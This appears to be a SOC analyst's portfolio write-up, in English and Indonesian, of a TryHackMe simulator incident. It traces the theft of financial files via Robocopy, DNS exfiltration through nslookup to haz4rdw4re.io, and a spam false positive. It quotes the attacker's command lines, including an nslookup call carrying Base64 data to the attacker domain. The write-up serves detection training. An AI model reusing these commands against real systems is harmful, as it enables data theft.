# SOC Investigation Writeup
## TryHackMe SOC Simulator — Incident: Financial Data Theft & DNS Exfiltration

**Author:** Said  
**Platform:** TryHackMe SOC Immersive Simulator  
**Tools Used:** Splunk SIEM, Sysmon, Email Datasource  
**Date:** 2026

---

## Overview

This writeup documents a multi-alert investigation conducted in the TryHackMe SOC Simulator. A single attacker session (PowerShell PID 3728 on host `win-3450`) triggered **two separate alerts** representing two phases of the same attack: data collection (Alert 1023) and data exfiltration (Alert 1025). A third, unrelated alert (1011) is included to demonstrate False Positive triage.

This case demonstrates the importance of **alert correlation** — recognizing when multiple alerts belong to a single attack chain rather than treating them as isolated events.

---

## Incident Summary

| Item | Detail |
|---|---|
| Host | win-3450 |
| User | michael.ascot |
| Attacker Process | powershell.exe (PID 3728) |
| Attack Type | Data theft → DNS Exfiltration |
| Target Data | Financial records (`SSF-FinancialRecords` on `FILESRV-01`) |
| Exfiltration Channel | DNS tunneling to `haz4rdw4re.io` |
| Alerts Triggered | 1023 (True Positive), 1025 (True Positive) |
| Unrelated Alert | 1011 (False Positive) |

---

## Full Attack Timeline (Single Session — 05/30/2026)

All activity below was executed by **the same process: `powershell.exe`, PID 3728**.

| Time | Event | Alert |
|---|---|---|
| 05:49:55 | PowerShell session initiated | — |
| 05:51:29 | Staging folder `exfiltration\` created | — |
| 05:51:36 | `net.exe use Z: \\FILESRV-01\SSF-FinancialRecords` | — |
| **05:52:23** | **Robocopy copies financial files to staging folder** | **1023** |
| 05:52:34 | `net.exe use Z: /delete` (anti-forensics) | — |
| 05:52:52 | Files compressed into `exfilt8me.zip` | — |
| **05:53:21** | **8x nslookup → Base64 chunks → haz4rdw4re.io** | **1025** |
| 05:53:37 | Final nslookup calls complete exfiltration | 1025 |

```
[05:49] PowerShell session starts (PID 3728)
   |
   v
[05:51] Create staging folder "exfiltration"
   |
   v
[05:51] Mount \\FILESRV-01\SSF-FinancialRecords --> Z:
   |
   v
[05:52] ALERT 1023: Robocopy copies financial files --> staging folder
   |
   v
[05:52] Disconnect Z: (remove access trace)
   |
   v
[05:52] Compress stolen files --> exfilt8me.zip
   |
   v
[05:53] ALERT 1025: Split ZIP into Base64 chunks,
        exfiltrate via DNS queries to haz4rdw4re.io
```

---

## Investigation 1 — Alert 1023: Data Theft via Robocopy

### Alert Details

| Field | Value |
|---|---|
| Alert ID | 1023 |
| Alert Rule | Suspicious Parent Child Relationship |
| Severity | Low |
| Type | Process |
| Timestamp | 05/30/2026 05:51:00 |
| Host | win-3450 |
| Datasource | Sysmon (Event Code 1) |
| Verdict | **TRUE POSITIVE** |

### Initial Alert Indicators

```
Parent Process : powershell.exe (PID 3728)
Child Process  : Robocopy.exe (PID 8356)
Command Line   : "C:\Windows\system32\Robocopy.exe" . C:\Users\michael.ascot\downloads\exfiltration /E
Working Dir    : Z:\
```

<img width="940" height="529" alt="image" src="https://github.com/user-attachments/assets/871b1b02-34eb-49b2-abc4-cc1e5d817255" />

---

### Splunk Investigation

**Query used:**
```splunk
index=* "win-3450" "Robocopy"
```

**Result:** 3 events — Robocopy execution + 2 files created.

```
Event 1: Robocopy.exe spawned by powershell.exe (PID 3728) dari Z:\
Event 2: File created — ClientPortfolioSummary.xlsx
Event 3: File created — InvestorPresentation2023.pptx
```


<img width="940" height="529" alt="image" src="https://github.com/user-attachments/assets/f1c11e0d-4da4-4a54-b867-7a491512fea8" />
<img width="940" height="529" alt="image" src="https://github.com/user-attachments/assets/29f711ca-6e7a-43cb-a630-3f006ecbc946" />
<img width="940" height="529" alt="image" src="https://github.com/user-attachments/assets/ec12a66a-7e62-482c-85ed-fd402ac67043" />

---

### Confirming Drive Z:

**Query used:**
```splunk
index=* "win-3450" | sort _time
```

97 events ditemukan. Timeline menunjukkan:

```
05:51:36 -> net.exe use Z: \\FILESRV-01\SSF-FinancialRecords
05:52:23 -> Robocopy copies files from Z:\ (15 detik setelah mount)
```

Terbukti: `Z:\` = `\\FILESRV-01\SSF-FinancialRecords`

---

### Related Entities

| Entity Type | Value |
|---|---|
| Compromised Host | win-3450 |
| Compromised User | michael.ascot |
| Attacker Process | powershell.exe (PID 3728) |
| Tool Abused | Robocopy.exe (PID 8356) |
| Source Share | \\FILESRV-01\SSF-FinancialRecords (Z:) |
| Destination | C:\Users\michael.ascot\Downloads\exfiltration\ |
| Files Stolen | ClientPortfolioSummary.xlsx, InvestorPresentation2023.pptx |
| Related Alert | Alert 1025 (same PID, ~1 menit kemudian) |

### MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|---|---|---|
| PowerShell | T1059.001 | powershell.exe menjalankan semua command |
| Network Share Access | T1135 / T1039 | Akses ke \\FILESRV-01\SSF-FinancialRecords |
| Data Staged | T1074.001 | Folder exfiltration sebagai staging area |
| Living off the Land | T1218 | Robocopy.exe (tool bawaan Windows) |
| Indicator Removal | T1070 | net use Z: /delete untuk hapus jejak |

### Recommended Actions

1. Isolasi host `win-3450` dari jaringan
2. Reset kredensial user `michael.ascot`
3. Audit access log `FILESRV-01` / share `SSF-FinancialRecords`
4. Gabungkan dengan Alert 1025 — tangani sebagai satu insiden
5. Buat SIEM rule: alert ketika Robocopy dijalankan PowerShell dari network drive yang baru di-mount

---

## Investigation 2 — Alert 1025: DNS Exfiltration via PowerShell

### Alert Details

| Field | Value |
|---|---|
| Alert ID | 1025 |
| Alert Rule | Suspicious Parent Child Relationship |
| Severity | High |
| Type | Process |
| Timestamp | 05/30/2026 05:53:21 |
| Host | win-3450 |
| Datasource | Sysmon (Event Code 1) |
| Verdict | **TRUE POSITIVE** |

### Initial Alert Indicators

```
Parent Process : powershell.exe (PID 3728)
Child Process  : nslookup.exe (PID 5520)
Command Line   : "C:\Windows\system32\nslookup.exe" UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io
Working Dir    : C:\Users\michael.ascot\downloads\exfiltration\
```


<img width="1456" height="819" alt="image" src="https://github.com/user-attachments/assets/7a58abef-5ae7-47e0-bafa-e425a8cafae2" />

---

### Splunk Investigation

**Query used:**
```splunk
index=* "win-3450" "3728" | sort _time
```

**Result:** 15 events — full attack chain terkonfirmasi.

<img width="1456" height="819" alt="image" src="https://github.com/user-attachments/assets/3648e452-2b7a-49fe-b88b-4bac1f0500d2" />


---

### DNS Exfiltration Explained

`nslookup.exe` (tool legitimate bawaan Windows) disalahgunakan untuk mengirim data keluar lewat DNS queries — traffic yang jarang diinspeksi firewall:

```
Normal usage   : nslookup google.com
Malicious usage: nslookup UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io
                           |________________________________|____________|
                                Data curian (Base64)          Domain attacker
```

File `exfilt8me.zip` (berisi dokumen keuangan yang dicuri di Alert 1023) dipotong menjadi 10 chunks Base64 dan dikirim sebagai subdomain DNS ke `haz4rdw4re.io`.

### Related Entities

| Entity Type | Value |
|---|---|
| Compromised Host | win-3450 |
| Compromised User | michael.ascot |
| Attacker Domain | haz4rdw4re.io |
| Exfiltrated File | exfilt8me.zip |
| Staging Folder | C:\Users\michael.ascot\Downloads\exfiltration\ |
| Related Alert | Alert 1023 (same PID, ~1 menit sebelumnya) |

### MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|---|---|---|
| PowerShell | T1059.001 | powershell.exe menjalankan semua command |
| Exfiltration Over DNS | T1048.001 | nslookup + Base64 subdomains ke haz4rdw4re.io |
| Archive Collected Data | T1560.001 | File dikompres jadi exfilt8me.zip |
| Living off the Land | T1218 | nslookup.exe (tool bawaan Windows) |

### Recommended Actions

1. Block domain `haz4rdw4re.io` di DNS/firewall
2. Implementasi DNS monitoring untuk subdomain Base64 yang panjang
3. Buat SIEM correlation rule: Robocopy dari network share + nslookup ke domain eksternal
4. Review DNS log seluruh organisasi untuk koneksi ke `haz4rdw4re.io`

---

## Investigation 3 — Alert 1011: Suspicious Email (False Positive)

### Alert Details

| Field | Value |
|---|---|
| Alert ID | 1011 |
| Alert Rule | Suspicious email from external domain |
| Severity | Low |
| Type | Phishing |
| Timestamp | 05/30/2026 05:37:42 |
| Datasource | Email |
| Verdict | **FALSE POSITIVE** |

### Email Details

| Field | Value |
|---|---|
| Sender | keane@modernmillinerygroup.online |
| Recipient | michael.ascot@tryhatme.com |
| Subject | Amazing Hat Enhancement Pills Grow Your Hat Collection Instantly |
| Attachment | None |
| Direction | Inbound |

> **Screenshot 6 — Alert 1011 detail dari Alert Queue**
> 
> *Drag & drop screenshot kamu di sini*

---

### Splunk Investigation

**Query 1:**
```splunk
index=* "michael.ascot@tryhatme.com" "keane@modernmillinerygroup.online"
```
Result: 1 event — hanya email itu sendiri.

**Query 2:**
```splunk
index=* "10.10.230.215"
```
Result: 0 events — tidak ada aktivitas lanjutan di host penerima.

> **Screenshot 7 — Splunk hasil query email (1 event) dan host activity (0 events)**
> 
> *Drag & drop screenshot kamu di sini*

---

### Why This is a False Positive

| Indicator | Finding |
|---|---|
| Malicious attachment | None |
| Suspicious links | None |
| Targeted content | No — generic spam |
| User interaction | None observed |
| Host activity after delivery | 0 events |
| SOC Lead note | "Detection rule still needs fine-tuning" |

### Recommended Actions

1. Tidak perlu incident response
2. Tune detection rule — exclude email tanpa attachment dan tanpa link
3. Tambahkan sender domain ke spam blocklist

---

## Skills Demonstrated

| Skill | Applied In |
|---|---|
| Alert triage and prioritization | Semua alert |
| Splunk SPL query writing | Semua alert |
| Sysmon log analysis | Alert 1023, 1025 |
| Parent-child process analysis | Alert 1023, 1025 |
| **Alert correlation (multi-alert → single attack chain)** | Alert 1023 + 1025 |
| Full-session timeline reconstruction | Alert 1023, 1025 |
| DNS exfiltration detection | Alert 1025 |
| Living off the Land identification | Alert 1023, 1025 |
| MITRE ATT&CK mapping | Alert 1023, 1025 |
| Email analysis | Alert 1011 |
| False positive identification | Alert 1011 |
| Case report writing | Semua alert |

---

## Lessons Learned

1. **Alert tidak berdiri sendiri.** Alert 1023 dan 1025 terlihat seperti dua alert terpisah, tapi analisis sesi penuh membuktikan keduanya adalah dua fase (collection + exfiltration) dari satu serangan oleh proses PowerShell yang sama.

2. **Selalu verifikasi, jangan asumsikan.** Asumsi bahwa Z: adalah financial share dikonfirmasi langsung dari log — event `net use Z:` terjadi 15 detik sebelum Robocopy berjalan.

3. **Living off the Land bypass AV.** Seluruh serangan hanya menggunakan tool bawaan Windows: `powershell.exe`, `net.exe`, `Robocopy.exe`, dan `nslookup.exe`.

4. **DNS adalah covert exfiltration channel.** Memotong file ZIP menjadi chunks Base64 lalu mengirimnya sebagai subdomain DNS melewati sebagian besar firewall yang tidak menginspeksi DNS traffic.

5. **Full-session query sangat powerful.** Review 97 events secara kronologis (`index=* "host" | sort _time`) adalah yang membuat hubungan antara Alert 1023 dan 1025 tidak terbantahkan.

6. **Tidak semua alert adalah ancaman nyata.** Alert 1011 menunjukkan pentingnya mengenali spam biasa dengan cepat agar waktu analyst bisa fokus ke insiden nyata.

---

*Writeup produced as part of cybersecurity portfolio — TryHackMe SOC Immersive Simulator — Said Almunawar*
